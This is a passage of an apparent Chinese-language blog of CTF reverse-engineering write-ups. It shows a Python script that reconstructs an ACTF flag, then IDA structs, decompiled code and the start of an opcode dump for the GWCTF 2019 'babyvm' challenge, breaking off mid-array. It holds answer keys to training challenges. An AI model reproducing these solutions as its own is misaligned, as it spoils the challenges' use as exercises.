class="code"><pre><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">b&quot;3@1b;b&quot;</span></span><br><span class="line">s2 = <span class="string">b&quot;Welcome &quot;</span>[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(s1, s2):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([(i ^ j) + <span class="number">35</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag += <span class="string">b&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x5B</span>, <span class="number">0x9D</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x98</span>, <span class="number">0x68</span>, <span class="number">0x8C</span>, <span class="number">0x65</span>, <span class="number">0xBB</span>, <span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0xD4</span>, <span class="number">0x09</span>, <span class="number">0xFD</span>, <span class="number">0xF3</span>, <span class="number">0x5C</span>, <span class="number">0x3C</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x8E</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x80</span>, <span class="number">0x44</span>, <span class="number">0xD6</span>, <span class="number">0xA9</span>, <span class="number">0x01</span>, <span class="number">0x32</span>, <span class="number">0x77</span>, <span class="number">0x29</span>, <span class="number">0x90</span>, <span class="number">0xBC</span>, <span class="number">0xC0</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x1D</span>, <span class="number">0xE4</span>, <span class="number">0x67</span>, <span class="number">0x7D</span>, <span class="number">0x2A</span>, <span class="number">0x2C</span>, <span class="number">0x59</span>, <span class="number">0x9E</span>, <span class="number">0x3D</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>, <span class="number">0x11</span>, <span class="number">0x43</span>, <span class="number">0x74</span>, <span class="number">0xD1</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x02</span>, <span class="number">0x4B</span>, <span class="number">0xAE</span>, <span class="number">0x99</span>, <span class="number">0x57</span>, <span class="number">0xC6</span>, <span class="number">0x73</span>, <span class="number">0xB0</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xB6</span>, <span class="number">0xD9</span>, <span class="number">0xDE</span>, <span class="number">0x7B</span>, <span class="number">0xCF</span>, <span class="number">0x4F</span>, <span class="number">0xB3</span>, <span class="number">0xD5</span>, <span class="number">0x08</span>, <span class="number">0x7C</span>, <span class="number">0x0A</span>, <span class="number">0x71</span>, <span class="number">0x12</span>, <span class="number">0x06</span>, <span class="number">0x37</span>, <span class="number">0xFF</span>, <span class="number">0x7F</span>, <span class="number">0xB7</span>, <span class="number">0x46</span>, <span class="number">0x42</span>, <span class="number">0x25</span>, <span class="number">0xC9</span>, <span class="number">0xD0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0xCE</span>, <span class="number">0xBD</span>, <span class="number">0x6C</span>, <span class="number">0xE5</span>, <span class="number">0x6F</span>, <span class="number">0xA5</span>, <span class="number">0x15</span>, <span class="number">0xED</span>, <span class="number">0x64</span>, <span class="number">0xF0</span>, <span class="number">0x23</span>, <span class="number">0x35</span>, <span class="number">0xE7</span>, <span class="number">0x0C</span>, <span class="number">0x61</span>, <span class="number">0xA4</span>, <span class="number">0xD7</span>, <span class="number">0x51</span>, <span class="number">0x75</span>, <span class="number">0x9A</span>, <span class="number">0xF2</span>, <span class="number">0x1E</span>, <span class="number">0xEB</span>, <span class="number">0x58</span>, <span class="number">0xF1</span>, <span class="number">0x94</span>, <span class="number">0xC3</span>, <span class="number">0x2F</span>, <span class="number">0x56</span>, <span class="number">0xF7</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0x47</span>, <span class="number">0xFB</span>, <span class="number">0x83</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0x21</span>, <span class="number">0x4A</span>, <span class="number">0x24</span>, <span class="number">0x07</span>, <span class="number">0x1C</span>, <span class="number">0x8A</span>, <span class="number">0x5A</span>, <span class="number">0x17</span>, <span class="number">0x1B</span>, <span class="number">0xDA</span>, <span class="number">0xEC</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0xB4</span>, <span class="number">0x48</span>, <span class="number">0x88</span>, <span class="number">0xF4</span>, <span class="number">0xB8</span>, <span class="number">0x27</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x97</span>, <span class="number">0xBE</span>, <span class="number">0x53</span>, <span class="number">0xC2</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0x1A</span>, <span class="number">0xE9</span>, <span class="number">0x2D</span>, <span class="number">0x14</span>, <span class="number">0x0B</span>, <span class="number">0xBF</span>, <span class="number">0xB5</span>, <span class="number">0x40</span>, <span class="number">0x79</span>, <span class="number">0xD2</span>, <span class="number">0x3E</span>, <span class="number">0x19</span>, <span class="number">0x5D</span>, <span class="number">0xF8</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0x5F</span>, <span class="number">0xDB</span>, <span class="number">0xFA</span>, <span class="number">0xB2</span>, <span class="number">0x8B</span>, <span class="number">0x6E</span>, <span class="number">0xA2</span>, <span class="number">0xDF</span>, <span class="number">0x16</span>, <span class="number">0xE2</span>, <span class="number">0x63</span>, <span class="number">0xB1</span>, <span class="number">0x20</span>, <span class="number">0xCB</span>, <span class="number">0xBA</span>, <span class="number">0xEE</span>, <span class="number">0x8D</span>, <span class="number">0xAA</span>, <span class="number">0xC8</span>, <span class="number">0xC7</span>, <span class="number">0xC5</span>, <span class="number">0x05</span>, <span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x3A</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0x0D</span>, <span class="number">0xCA</span>, <span class="number">0x84</span>, <span class="number">0x4E</span>, <span class="number">0xF5</span>, <span class="number">0x31</span>, <span class="number">0x6B</span>, <span class="number">0x92</span>, <span class="number">0xDC</span>, <span class="number">0xDD</span>, <span class="number">0x9C</span>, <span class="number">0x3F</span>, <span class="number">0x55</span>, <span class="number">0x96</span>, <span class="number">0xA1</span>, <span class="number">0x9F</span>, <span class="number">0xCD</span>, <span class="number">0x9B</span>, <span class="number">0xE3</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0x78</span>, <span class="number">0x10</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x8F</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x04</span>, <span class="number">0xAC</span>, <span class="number">0x41</span>, <span class="number">0x93</span>, <span class="number">0xD3</span>, <span class="number">0x3B</span>, <span class="number">0xEF</span>, <span class="number">0x03</span>, <span class="number">0x81</span>, <span class="number">0x70</span>, <span class="number">0xA6</span>, <span class="number">0x1F</span>, <span class="number">0x22</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x6A</span>, <span class="number">0xAB</span>, <span class="number">0x87</span>, <span class="number">0xAD</span>, <span class="number">0x49</span>, <span class="number">0x0F</span>, <span class="number">0xAF</span>]</span><br><span class="line">s3 = [<span class="number">0x30</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x30</span>, <span class="number">0x63</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    t = table.index(s3[i]) ^ (<span class="number">0x83</span> + i)</span><br><span class="line">    flag += <span class="built_in">bytes</span>([t])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">flag += <span class="string">b&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line">flag += <span class="string">b&quot;5mcsM&lt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;ACTF&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h3><p>ida打开，根据分析可以得到如下结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> VM              struc ; (<span class="keyword">sizeof</span>=<span class="number">0x88</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> r0              dd ?</span><br><span class="line"><span class="number">00000004</span> r1              dd ?</span><br><span class="line"><span class="number">00000008</span> r2              dd ?</span><br><span class="line"><span class="number">0000000</span>C r3              dd ?</span><br><span class="line"><span class="number">00000010</span> _ip             dq ?</span><br><span class="line"><span class="number">00000018</span> funs            func <span class="number">7</span> dup(?)</span><br><span class="line"><span class="number">00000088</span> VM              ends</span><br><span class="line"><span class="number">00000088</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> func            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: VM/r</span><br><span class="line"><span class="number">00000000</span> index           db ?</span><br><span class="line"><span class="number">00000001</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000002</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000003</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000004</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000005</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000006</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000007</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000008</span> fun             dq ?</span><br><span class="line"><span class="number">00000010</span> func            ends</span><br></pre></td></tr></table></figure><p>与主要函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input something:&quot;</span>);</span><br><span class="line">  init_VM((VM *)v3);</span><br><span class="line">  run_VM((VM *)v3);</span><br><span class="line">  check();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And the flag is GWHT&#123;true flag&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>init_VM</code>为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init_VM</span><span class="params">(VM *vm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vm-&gt;r0 = <span class="number">0</span>;</span><br><span class="line">  vm-&gt;r1 = <span class="number">18</span>;</span><br><span class="line">  vm-&gt;r2 = <span class="number">0</span>;</span><br><span class="line">  vm-&gt;r3 = <span class="number">0</span>;</span><br><span class="line">  vm-&gt;_ip = opcodes;</span><br><span class="line">  vm-&gt;funs[<span class="number">0</span>].index = <span class="number">0xF1</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">0</span>].fun = memory_operate;</span><br><span class="line">  vm-&gt;funs[<span class="number">1</span>].index = <span class="number">0xF2</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">1</span>].fun = xor_r0_r1;</span><br><span class="line">  vm-&gt;funs[<span class="number">2</span>].index = <span class="number">0xF5</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">2</span>].fun = check_flag_length;</span><br><span class="line">  vm-&gt;funs[<span class="number">3</span>].index = <span class="number">0xF4</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">3</span>].fun = inc_ip;</span><br><span class="line">  vm-&gt;funs[<span class="number">4</span>].index = <span class="number">0xF7</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">4</span>].fun = mul_r0_r3;</span><br><span class="line">  vm-&gt;funs[<span class="number">5</span>].index = <span class="number">0xF8</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">5</span>].fun = swap_r0_r1;</span><br><span class="line">  vm-&gt;funs[<span class="number">6</span>].index = <span class="number">0xF6</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">6</span>].fun = cal;</span><br><span class="line">  memory = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(memory, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则可写出脚本得到该虚拟机执行流程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">opcodes = [ <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span 